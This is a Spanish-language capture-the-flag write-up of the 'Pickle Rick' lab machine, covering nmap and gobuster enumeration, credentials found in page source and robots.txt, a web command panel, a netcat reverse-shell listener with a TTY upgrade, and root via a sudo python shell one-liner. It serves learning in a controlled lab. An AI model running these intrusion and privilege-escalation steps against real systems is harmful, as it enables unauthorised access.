---
Titulo: Pickle Rick
Fecha: 06-10-2025
categoria:
  - Hacking web
  - reverse shell
Dificultad_oficial: Fácil
Dificultad_percibida: ""
Estado: Terminado
---
## 1. Descripción del reto
Vale, aquí va a haber un pequeño paréntesis de porque hay dos writeUp de una misma máquina.
Bueno, esto es principalmente porque en la ruta que estoy realizando de "Web Fundamentals" la última sala es hacer esta máquina, por lo que lo tengo que hacer de nuevo y así hago un 2x1 miro que tanto he mejorado y corrijo/mejoro los errores del pasado.
Mi objetivo actual con esta máquina es comprobar que tanto he crecido con hacker o pentester con esta máquina que tengo que rehacer por segunda vez por voluntad propia.

## 2. Enumeración / Reconocimiento
Bueno, como en toda máquina de este estilo donde estamos en un entorno controlado y no nos tenemos que "esconder" de nada y nada de ese estilo voy a hacer un escaneo un poco bruto que en un sistema real no se recomienda hacer porque te detectan antes de siquiera entrar. Y bueno claro, vamos a ver que es lo que tiene que no me he hecho spoiler ninguno.

```shell
root@ip-10-10-99-129:~# nmap -Pn -T5 -sS -O -n 10.10.83.47
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-06 11:35 BST
Nmap scan report for 10.10.83.47
Host is up (0.00034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:59:74:A8:28:D3 (Unknown)
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds
```

Bueno, con esto ya tenemos bastante información, primero que nada vemos que es un linux, segundo tiene dos puertos abiertos el 22 y el 80 (ssh y http). Voy a ver si con nmap saco alguna vulnerabilidad interesante. sino vamos a ver que hay en el puerto 80.

```shell
root@ip-10-10-99-129:~# nmap -sC -p 22,80 -n 10.10.83.47
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-06 11:39 BST
Nmap scan report for 10.10.83.47
Host is up (0.00011s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-title: Rick is sup4r cool
MAC Address: 02:59:74:A8:28:D3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
```

Ahora que ya queda descartado los exploits generales vamos a ver que podemos sacar de la página web, ya que con ssh no detecto nada, aunque ahora acordándome vamos a sacar las versiones de los servicios por si nos hace falta en un futuro.

```shell
root@ip-10-10-99-129:~# nmap -sC -p 22,80 -n -sV --min-rate 5000 10.10.83.47
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-06 11:41 BST
Nmap scan report for 10.10.83.47
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:59:74:A8:28:D3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
```

Ahora si, vamos a ver que podemos encontrar en la página web, en lo que carga voy a lanzar un escaneo de directorios por si encuentro algo.

```txt
Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!
```

Entrando en la pagina web, vemos como tiene este texto y una imagen, el texto en resumen es de rick pidiendo ayuda a morty (nosotros) para descubrir los 3 últimos ingredientes de la poción que le devuelve a su estado normal. No nos da mucha información con esto por lo que voy a ver si consigo algo más con la consola, código fuente, archivos, etc...

```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

Bueno, primer intento, primera pista ya tenemos un usuario ahora puedo probar dos cosas, hacer fuzzing al ssh o seguir investigando la pagina, que es lo que veo más sensato ahora mismo.

Vale, no parece que haya más nada a primera vista, por lo que ahora continuo con lo que me dio el escaneo de directorios con la herramienta `gobuster`.

```shell
root@ip-10-10-99-129:~# gobuster dir -u "http://10.10.83.47" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.83.47
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.10.83.47/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/server-status        (Status: 403) [Size: 276]
/clue.txt             (Status: 200) [Size: 54]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veo directorios interesantes como puede ser "clue", "robots", "login" y "portal". Vamos a ver que hay dentro de cada uno.

```text
Look around the file system for the other ingredient.
```

Entre en "clue.txt" y no parece que sea nada para ahora, sino para más adelante, aún así todo información recopilada en el momento es interesante, por lo que vamos al archivo "robots.txt".

```txt
Wubbalubbadubdub
```

Vemos que en "robots.txt" hay una palabra grande, esto no parece que este cifrado por lo que ahora no me preocupare por ello, me lo guardo para después por si puede ser interesante.

No me pude resistir y antes de seguir con nada me puse a ver si estaba cifrado de alguna forma y no encontré nada interesante por lo que busque la palabra literal y parece que es una frase que se utiliza de forma recurrente en forma de chiste en la serie, por lo que he leído es una frase de un pueblo pajaro de la serie, y el significado es y cito ""Wubba lubba dub dub" es una frase icónica de Rick Sanchez en la serie Rick and Morty que, en el idioma del Pueblo Pájaro, ==significa "Tengo un gran dolor, por favor, ayúdenme"==". Bueno, ahora ya que mi curiosidad esta satisfecha, puedo volver al trabajo.
Con lo que tengo ahora, voy a poner el usuario que encontré y la frase esta que he encontrado como contraseña, haber si funciona, sino tendré que fuzzear la contraseña con hydra.

Pues funciona, ahora haber si podemos extraer más información desde ya dentro.
Lo primero que vi es una pestaña con un ejecutor de comandos, eso lo tendré que probar porque casi siempre nunca es buena señal, ya que debería de estar super limitado pero nunca lo esta, y ya viendo el enlace que hay en las otras pestañas, veo que directamente me manda a un 404 personalizado por lo que ya veo que me dicen de forma indirecta que tengo que ejecutar algún tipo de reverse shell con el ejecutor de comandos, por lo que voy a probar algunos comando y si todos funcionan voy a probar con la reverse shell.

Analizando la pagina de ejecución de comandos vi como no podía ejecutar el comando "cat" por lo que me puse a analizar los documentos js en busca de ver si era algún tipo de bloqueo del lado del cliente, pero veo que una protección del lado del servidor, bueno no me enrollo, en la pagina medio escondido encontré un comentario con `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`   y pensé que ya tenía otra pista, pero cuando lo descifre me arrepentí... era un "rabbit hole" de forma literal...

Bueno, ahora que me puse ha ver que tenia en los directorios veo que el primer archivo es "Sup3rS3cretPickl3Ingred.txt", pero con el comando "cat" no pude, por lo que voy a probar con variantes de este comando haber si puedo hacer algo con el.

Probé con el comando "less" y pude, voy a ver si encuentro más ingredientes, vale encontré el segundo ingrediente de rick, esta en "/home/rick/sencond ingredient" pero el tercero no lo consigo encontrar, voy a lanzar una reverse shell para estar en un entorno más cómodo y sin la restricción del cat y otras posibles restricciones.
## 3. Explotación / Desarrollo
Bueno, me puse a intentar obtener una reverse shell sin ningún criterio hasta que recordé analizando los directorios vi que tenia instalado python3 por lo que me puse a ejecutar una shell con ese criterio y bingo! ahora toca ver si la puedo mejorar o me quedo con la reverse shell simple.

```shell
root@ip-10-10-99-129:~# nc -lvnp 8081
Listening on 0.0.0.0 8081
Connection received on 10.10.83.47 46006
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
sh: 1: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-83-47:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@ip-10-10-83-47:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 8081
root@ip-10-10-99-129:~# stty raw -echo; fg
nc -lvnp 8081
             ls
Sup3rS3cretPickl3Ingred.txt  clue.txt	 index.html  portal.php
assets			     denied.php  login.php   robots.txt
www-data@ip-10-10-83-47:/var/www/html$ ^C
www-data@ip-10-10-83-47:/var/www/html$ ^C
```

Ahora ya tenemos una shell completamente mejorada, ahora si a investigar bien.

```shell
www-data@ip-10-10-83-47:/$ cd /root
bash: cd: /root: Permission denied
www-data@ip-10-10-83-47:/$ sudo -l
Matching Defaults entries for www-data on ip-10-10-83-47:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-83-47:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-83-47:/$ sudo python3 -c 'import os; os.system("/bin/sh")'
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@ip-10-10-83-47:/#
```

Vi que podía ejecutar directamente todos los comandos y me fui por lo conocido, y mejore la shell nuevamente.

```shell
root@ip-10-10-83-47:/# cat /home/rick/second\ ingredients 
#############
root@ip-10-10-83-47:/# cd /root
root@ip-10-10-83-47:~# ls
3rd.txt  snap
root@ip-10-10-83-47:~# cat 3rd.txt 
#######################
```

Y solo me faltaban enumerar las soluciones.
## 4. Notas y aprendizajes

- Punto fuerte: Aprendes a analizar mejor todo
    
- Dificultad encontrada: Ninguna
    
- Conceptos nuevos aprendidos: Mejor entendimiento de las herramientas